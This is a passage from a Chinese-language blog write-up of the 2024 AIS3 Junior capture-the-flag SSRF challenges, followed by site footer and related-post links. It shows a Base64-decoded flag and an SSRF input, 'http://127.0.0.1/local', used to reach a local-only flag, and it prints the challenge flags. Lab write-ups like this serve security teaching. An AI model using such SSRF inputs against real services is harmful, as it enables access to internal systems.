+<p><img src="https://hackmd.io/_uploads/BkL9VJpcR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>發現有可以 Base64 decode 的東東<br>
+<code>QUlTM19KdW5pb3J7ZmlsZTovL1NTUkZfX19YREREfQ==</code><br>
+解碼後</p>
+<p><img src="https://hackmd.io/_uploads/SybyHypqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{file://SSRF___XDDD}</code></p></blockquote>
+<h2 id="srf02">SRF02
+</h2><p>這題上課有說到 FLAG 在 local 所以可以打出以下內容<br>
+<code>http://127.0.0.1/local</code><br>
+剩下過程和上一題一樣</p>
+<p><img src="https://hackmd.io/_uploads/SkmBuJpqR.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>FLAG：AIS3_Junior{http://BROAccessLOCAL}</code></p></blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/2024/">2024</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相關文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/en/post/2024-ais3-junior-llm%E3%84%89writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/en/post/2024-ais3-junior-llm%E3%84%89writeup/image.225b4d9249aa4fcd9b309107e83a78b3_hu_c65ab6a7c527d882.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2024 AIS3 Junior LLMㄉWriteup"
+                        
+                        data-hash="md5-IltNkkmqT82bMJEH6Dp4sw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2024 AIS3 Junior LLMㄉWriteup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/en/post/2025-ais3-junior-%E5%89%8D%E7%AB%AF%E3%84%89writeup/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Junior 前端ㄉWriteup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/en/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/en/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.5ab70826d39309c1a688c7071ac99392_hu_fcc0943aefb20505.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025 AIS3 Junior 後端ㄉWriteup"
+                        
+                        data-hash="md5-WrcIJtOTCcGmiMcHGsmTkg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Junior 後端ㄉWriteup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/en/post/2025-ais3-pre-exam-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://hackmd.io/_uploads/HkXttAUMge.png" loading="lazy" data-key="" data-hash="https://hackmd.io/_uploads/HkXttAUMge.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Pre-exam Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/en/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/">
+        
+        
+            <div class="article-image">
+                <img src="/en/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/image.dbde94113b17ab422760313a64186c77_hu_774337f90fe6e08.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 2025 AIS3 Junior 心得"
+                        
+                        data-hash="md5-296UETsXq0InYDE6ZBhsdw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025 AIS3 Junior 心得</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Chun-Hao Chung
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 建立 <br />
+        主題 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 設計
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.aaef3a961ffacff098c2b21c98ba98037ab30a12c33d3cdee0dd231bd52cfe68.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
